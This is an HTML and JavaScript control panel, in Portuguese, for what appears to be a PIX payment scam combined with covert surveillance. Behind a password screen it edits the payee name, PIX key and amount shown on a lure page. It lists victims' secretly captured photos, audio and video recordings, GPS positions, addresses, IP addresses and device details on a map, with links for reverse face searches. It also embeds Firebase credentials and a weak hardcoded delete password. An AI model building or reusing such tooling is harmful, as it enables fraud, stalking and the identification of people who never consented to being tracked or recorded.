<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Painel de Controle e Histórico</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <style>
    * { box-sizing: border-box; }
    body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; height: 100vh; background: #0f172a; }
    
    #loginOverlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: #0f172a;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }
    .login-box {
      background: #1e293b;
      padding: 32px;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
      width: 90%;
      max-width: 340px;
      text-align: center;
      color: #f8fafc;
      border: 1px solid #334155;
    }
    .login-box h2 { margin: 0 0 8px; font-size: 20px; }
    .login-box p { font-size: 12px; color: #94a3b8; margin-bottom: 20px; }
    .login-box input {
      width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #475569;
      background: #0f172a; color: white; font-size: 14px; margin-bottom: 12px; outline: none;
    }
    .login-box input:focus { border-color: #6366f1; }
    .login-box button {
      width: 100%; padding: 12px; background: #4f46e5; color: white;
      border: none; border-radius: 8px; font-weight: 600; cursor: pointer;
    }
    .login-box button:hover { background: #4338ca; }
    #erroSenha { color: #f87171; font-size: 12px; margin-top: 10px; display: none; }

    #painelConteudo { display: none; width: 100%; height: 100%; }

    #sidebar {
      width: 420px;
      background: #ffffff;
      border-right: 1px solid #e5e7eb;
      display: flex;
      flex-direction: column;
      z-index: 1000;
      overflow-y: auto;
    }
    
    .sidebar-header { padding: 16px; background: #4f46e5; color: white; }
    .sidebar-header h2 { margin: 0; font-size: 18px; }
    .sidebar-header p { margin: 4px 0 0; font-size: 12px; opacity: 0.8; }

    .config-box { padding: 16px; background: #f8fafc; border-bottom: 1px solid #e2e8f0; }
    .config-box h3 { margin: 0 0 12px; font-size: 14px; color: #1e293b; }
    .field { margin-bottom: 10px; }
    .field label { display: block; font-size: 11px; font-weight: 600; color: #64748b; margin-bottom: 4px; text-transform: uppercase; }
    .field input { width: 100%; padding: 8px 10px; font-size: 13px; border: 1px solid #cbd5e1; border-radius: 6px; outline: none; }
    .field input:focus { border-color: #4f46e5; }
    
    .btn-salvar {
      width: 100%; padding: 10px; background: #4f46e5; color: white;
      border: none; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; margin-top: 4px;
    }
    .btn-salvar:hover { background: #4338ca; }
    #statusConfig { font-size: 12px; margin-top: 6px; text-align: center; min-height: 16px; color: #059669; font-weight: 500; }

    .historico-section { padding: 16px; flex: 1; }
    .historico-section h3 { margin: 0 0 10px; font-size: 14px; color: #1e293b; }

    .item-historico {
      position: relative;
      background: #f9fafb; border: 1px solid #e5e7eb; border-radius: 12px;
      padding: 12px; padding-right: 36px; margin-bottom: 12px; cursor: pointer; transition: background 0.2s, border-color 0.2s;
      display: flex; flex-direction: column; gap: 10px;
    }
    .item-historico:hover { background: #eef2ff; border-color: #6366f1; }
    .item-historico.active { background: #e0e7ff; border-color: #4f46e5; }

    .item-topo { display: flex; gap: 12px; align-items: flex-start; }

    .btn-deletar {
      position: absolute; top: 8px; right: 8px; background: #fee2e2; color: #ef4444;
      border: none; border-radius: 50%; width: 24px; height: 24px; font-size: 13px; font-weight: bold;
      cursor: pointer; display: flex; align-items: center; justify-content: center; transition: background 0.2s, color 0.2s;
      z-index: 5;
    }
    .btn-deletar:hover { background: #ef4444; color: white; }

    .item-foto-thumb {
      width: 70px; height: 70px; border-radius: 8px; object-fit: cover;
      background: #cbd5e1; border: 1px solid #94a3b8; flex-shrink: 0; cursor: zoom-in;
    }

    .item-detalhes { flex: 1; min-width: 0; }
    .item-data { font-weight: bold; font-size: 13px; color: #111827; }
    .item-hora { font-size: 12px; color: #4f46e5; font-weight: 600; margin-top: 2px; }
    .item-endereco { font-size: 12px; color: #1e293b; font-weight: 500; margin-top: 4px; line-height: 1.3; }
    .item-coords { font-size: 11px; color: #6b7280; margin-top: 4px; }
    
    .item-dispositivo {
      padding: 8px;
      background: #f1f5f9;
      border-radius: 6px;
      font-size: 11px;
      color: #334155;
      line-height: 1.4;
      border: 1px solid #e2e8f0;
    }

    .video-player {
      width: 100%;
      border-radius: 8px;
      background: #000;
      max-height: 220px;
      outline: none;
    }

    .popup-media {
      width: 100%; max-width: 220px; border-radius: 8px; margin-top: 6px;
    }

    #map { flex: 1; height: 100vh; }

    #fotoModal {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(15, 23, 42, 0.85); display: none; align-items: center; justify-content: center;
      z-index: 10000; padding: 20px; backdrop-filter: blur(4px);
    }
    .modal-conteudo {
      background: #1e293b; border-radius: 16px; padding: 20px; max-width: 90%; max-height: 90vh;
      display: flex; flex-direction: column; align-items: center; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
      position: relative; border: 1px solid #334155;
    }
    .modal-fechar {
      position: absolute; top: 12px; right: 12px; background: #334155; color: white;
      border: none; font-size: 16px; border-radius: 50%; width: 32px; height: 32px;
      cursor: pointer; display: flex; align-items: center; justify-content: center;
    }
    .modal-fechar:hover { background: #ef4444; }
    .modal-img {
      max-width: 100%; max-height: 60vh; border-radius: 8px; object-fit: contain; margin-bottom: 16px;
    }
    .modal-acoes {
      display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; width: 100%;
    }
    .btn-busca {
      padding: 10px 14px; border-radius: 8px; border: none; font-weight: 600; font-size: 12px;
      cursor: pointer; display: flex; align-items: center; gap: 6px; text-decoration: none; color: white;
    }
    .btn-google { background: #2563eb; }
    .btn-google:hover { background: #1d4ed8; }
    .btn-face { background: #7c3aed; }
    .btn-face:hover { background: #6d28d9; }

    @media (max-width: 600px) {
      #painelConteudo { flex-direction: column-reverse; }
      #sidebar { width: 100%; height: 50vh; }
      #map { height: 50vh; }
    }
  </style>
</head>
<body>

  <div id="loginOverlay">
    <div class="login-box">
      <h2>🔒 Acesso Restrito</h2>
      <p>Digite a senha para desbloquear o painel.</p>
      <input type="password" id="inputSenha" placeholder="Digite a senha..." autofocus />
      <button id="btnEntrar">Acessar Painel</button>
      <div id="erroSenha">Senha incorreta!</div>
    </div>
  </div>

  <div id="painelConteudo">
    <div id="sidebar">
      <div class="sidebar-header">
        <h2>Painel de Controle</h2>
        <p id="total-registros">Carregando...</p>
      </div>

      <div class="config-box">
        <h3>✏️ Editar Informações da Tela</h3>
        
        <div class="field">
          <label>Nome</label>
          <input type="text" id="inputNome" placeholder="Ex: Maria Oliveira">
        </div>

        <div class="field">
          <label>Chave PIX</label>
          <input type="text" id="inputChave" placeholder="Ex: maria@email.com">
        </div>

        <div class="field">
          <label>Valor</label>
          <input type="text" id="inputValor" placeholder="Ex: R$ 150,00">
        </div>

        <button class="btn-salvar" id="btnSalvarConfig">Atualizar Tela Instantaneamente</button>
        <div id="statusConfig"></div>
      </div>

      <div class="historico-section">
        <h3>📜 Capturas, Vídeos e Localizações</h3>
        <div id="lista-historico">
          <p style="text-align: center; color: #6b7280; margin-top: 20px;">Aguardando envios...</p>
        </div>
      </div>
    </div>

    <div id="map"></div>
  </div>

  <div id="fotoModal">
    <div class="modal-conteudo">
      <button class="modal-fechar" id="btnFecharModal">✕</button>
      <img id="modalImg" class="modal-img" src="" alt="Foto Ampliada" />
      <div class="modal-acoes">
        <a id="btnGoogleLens" target="_blank" class="btn-busca btn-google">
          🔎 Buscar Foto no Google Lens
        </a>
        <a id="btnFaceCheck" href="https://facecheck.id/pt" target="_blank" class="btn-busca btn-face">
          👤 Buscar Rosto (FaceCheck.ID)
        </a>
      </div>
    </div>
  </div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getDatabase, ref, onValue, set, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

    const HASH_CORRETO = "5ca338aa87b30d0dc7206d889904b6e260896c52eb7a9d412a717efd7f2d7f71";

    async function sha256(str) {
      const buffer = new TextEncoder().encode(str);
      const hashBuffer = await crypto.subtle.digest("SHA-256", buffer);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map(b => b.toString(16).padStart(2, "0")).join("");
    }

    const loginOverlay = document.getElementById('loginOverlay');
    const painelConteudo = document.getElementById('painelConteudo');
    const inputSenha = document.getElementById('inputSenha');
    const btnEntrar = document.getElementById('btnEntrar');
    const erroSenha = document.getElementById('erroSenha');

    const fotoModal = document.getElementById('fotoModal');
    const modalImg = document.getElementById('modalImg');
    const btnFecharModal = document.getElementById('btnFecharModal');
    const btnGoogleLens = document.getElementById('btnGoogleLens');

    window.abrirModalFoto = function(urlFoto) {
      if (!urlFoto) return;
      modalImg.src = urlFoto;
      btnGoogleLens.href = `https://lens.google.com/uploadbyurl?url=${encodeURIComponent(urlFoto)}`;
      fotoModal.style.display = 'flex';
    };

    btnFecharModal.addEventListener('click', () => fotoModal.style.display = 'none');
    fotoModal.addEventListener('click', (e) => {
      if (e.target === fotoModal) fotoModal.style.display = 'none';
    });

    async function tentarLogin() {
      const hashDigitado = await sha256(inputSenha.value);
      if (hashDigitado === HASH_CORRETO) {
        sessionStorage.setItem('autenticado_painel', 'true');
        liberarPainel();
      } else {
        erroSenha.style.display = 'block';
        inputSenha.value = '';
      }
    }

    btnEntrar.addEventListener('click', tentarLogin);
    inputSenha.addEventListener('keypress', (e) => { if (e.key === 'Enter') tentarLogin(); });

    if (sessionStorage.getItem('autenticado_painel') === 'true') {
      liberarPainel();
    }

    function liberarPainel() {
      loginOverlay.style.display = 'none';
      painelConteudo.style.display = 'flex';
      iniciarAplicacao();
    }

    function iniciarAplicacao() {
      const firebaseConfig = {
        apiKey: "AIzaSyCWmb-8mTJcIJNWyisaS1qfeSDs1irw9IU",
        authDomain: "localizacao-2fa1a.firebaseapp.com",
        databaseURL: "https://localizacao-2fa1a-default-rtdb.firebaseio.com",
        projectId: "localizacao-2fa1a",
        storageBucket: "localizacao-2fa1a.firebasestorage.app",
        messagingSenderId: "1056273872739",
        appId: "1:1056273872739:web:65f045fafcdec22b3ac556",
        measurementId: "G-8N2KJP40KF"
      };

      const app = initializeApp(firebaseConfig);
      const db = getDatabase(app);

      const inputNome = document.getElementById('inputNome');
      const inputChave = document.getElementById('inputChave');
      const inputValor = document.getElementById('inputValor');
      const btnSalvarConfig = document.getElementById('btnSalvarConfig');
      const statusConfig = document.getElementById('statusConfig');

      onValue(ref(db, 'config/pix'), (snapshot) => {
        const data = snapshot.val();
        if (data) {
          if (document.activeElement !== inputNome) inputNome.value = data.nome || '';
          if (document.activeElement !== inputChave) inputChave.value = data.chave || '';
          if (document.activeElement !== inputValor) inputValor.value = data.valor || '';
        }
      });

      btnSalvarConfig.addEventListener('click', () => {
        set(ref(db, 'config/pix'), {
          nome: inputNome.value,
          chave: inputChave.value,
          valor: inputValor.value
        }).then(() => {
          statusConfig.innerText = '✅ Atualizado com sucesso!';
          setTimeout(() => statusConfig.innerText = '', 3000);
        }).catch((err) => {
          statusConfig.innerText = '❌ Erro: ' + err.message;
        });
      });

      const map = L.map('map').setView([-14.235, -51.925], 4);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap'
      }).addTo(map);

      let marcadores = [];
      const listaContainer = document.getElementById('lista-historico');
      const totalText = document.getElementById('total-registros');

      onValue(ref(db, 'localizacao/historico'), (snapshot) => {
        const data = snapshot.val();
        listaContainer.innerHTML = '';

        if (!data) {
          totalText.innerText = '0 registros encontrados';
          listaContainer.innerHTML = '<p style="text-align: center; color: #6b7280; margin-top: 20px;">Nenhuma localização enviada ainda.</p>';
          
          marcadores.forEach(m => map.removeLayer(m));
          marcadores = [];
          return;
        }

        const registros = Object.keys(data).map(key => ({ id: key, ...data[key] })).reverse();
        totalText.innerText = `${registros.length} registro(s) salvo(s)`;

        marcadores.forEach(m => map.removeLayer(m));
        marcadores = [];

        registros.forEach((item, index) => {
          const dataObj = new Date(item.timestamp);
          const dataFormatada = dataObj.toLocaleDateString('pt-BR');
          const horaFormatada = dataObj.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

          const mediaPopupHtml = item.video 
            ? `<video src="${item.video}" controls playsinline muted poster="${item.foto || ''}" class="popup-media">Seu navegador não suporta vídeo.</video>`
            : (item.foto 
                ? `<img src="${item.foto}" class="popup-media" onclick="abrirModalFoto('${item.foto}')" title="Clique para ampliar" />` 
                : `<p style="font-size:11px; color:#6b7280;">Sem foto/vídeo</p>`);

          const enderecoTexto = item.endereco || 'Endereço aguardando/não registrado';
          const disp = item.dispositivo || {};

          const dispInfoHtml = item.dispositivo ? `
            <div class="item-dispositivo">
              🌐 <b>IP:</b> ${disp.ip || 'N/A'} (${disp.provedor || 'N/A'})<br>
              🔋 <b>Bateria:</b> ${disp.bateria || 'N/A'}<br>
              📶 <b>Conexão:</b> ${disp.conexao || 'N/A'} | 📱 <b>Tela:</b> ${disp.tela || 'N/A'}
            </div>
          ` : '';

          const dispPopupHtml = item.dispositivo ? `
            <hr style="margin: 6px 0; border: 0; border-top: 1px solid #e2e8f0;">
            <small style="color:#475569;">
              🌐 <b>IP:</b> ${disp.ip || 'N/A'}<br>
              🔋 <b>Bateria:</b> ${disp.bateria || 'N/A'}<br>
              📶 <b>Conexão:</b> ${disp.conexao || 'N/A'} | <b>Tela:</b> ${disp.tela || 'N/A'}
            </small>
          ` : '';

          const lat = item.lat || -14.235;
          const lng = item.lng || -51.925;

          const m = L.marker([lat, lng]).addTo(map)
            .bindPopup(`
              <b>${dataFormatada} às ${horaFormatada}</b><br>
              <small style="color:#334155;">🏠 ${enderecoTexto}</small><br>
              ${dispPopupHtml}
              ${mediaPopupHtml}
            `);
          marcadores.push(m);

          const card = document.createElement('div');
          card.className = `item-historico ${index === 0 ? 'active' : ''}`;
          
          const imgThumb = item.foto 
            ? `<img src="${item.foto}" class="item-foto-thumb" title="Clique para ampliar" onclick="event.stopPropagation(); abrirModalFoto('${item.foto}')" />`
            : `<div class="item-foto-thumb" style="display:flex;align-items:center;justify-content:center;font-size:10px;color:#64748b;">Sem foto</div>`;

          // Indica status em tempo real na sidebar enquanto o vídeo está sendo gravado
          const videoPlayerHtml = item.video ? `
            <video src="${item.video}" controls playsinline muted poster="${item.foto || ''}" class="video-player" onclick="event.stopPropagation();">
              Seu navegador não suporta reprodução de vídeo.
            </video>
          ` : `<p style="font-size:11px; color:#6366f1; margin:0; font-weight: 500;">🔴 Gravando áudio/vídeo... (Será enviado ao fechar/sair da página)</p>`;

          const coordsText = item.lat ? `📍 Lat: ${item.lat.toFixed(4)}, Lng: ${item.lng.toFixed(4)} (±${Math.round(item.precisao)}m)` : '📍 Aguardando coordenadas GPS...';

          card.innerHTML = `
            <button class="btn-deletar" title="Apagar captura">✕</button>
            <div class="item-topo">
              ${imgThumb}
              <div class="item-detalhes">
                <div class="item-data">📅 ${dataFormatada}</div>
                <div class="item-hora">🕒 ${horaFormatada}</div>
                <div class="item-endereco">🏠 ${enderecoTexto}</div>
                <div class="item-coords">${coordsText}</div>
              </div>
            </div>
            ${videoPlayerHtml}
            ${dispInfoHtml}
          `;

          const btnDeletar = card.querySelector('.btn-deletar');
          btnDeletar.addEventListener('click', (e) => {
            e.stopPropagation();
            const senha = prompt("Digite a senha para confirmar a exclusão deste registro:");
            if (senha === "123") {
              remove(ref(db, `localizacao/historico/${item.id}`))
                .catch((err) => alert("Erro ao apagar: " + err.message));
            } else if (senha !== null) {
              alert("Senha incorreta! O registro não foi apagado.");
            }
          });

          card.addEventListener('click', () => {
            document.querySelectorAll('.item-historico').forEach(c => c.classList.remove('active'));
            card.classList.add('active');
            if (item.lat && item.lng) {
              map.setView([item.lat, item.lng], 17);
              m.openPopup();
            }
          });

          listaContainer.appendChild(card);

          if (index === 0 && item.lat && item.lng) {
            map.setView([item.lat, item.lng], 17);
            m.openPopup();
          }
        });
      });
    }
  </script>
</body>
</html>
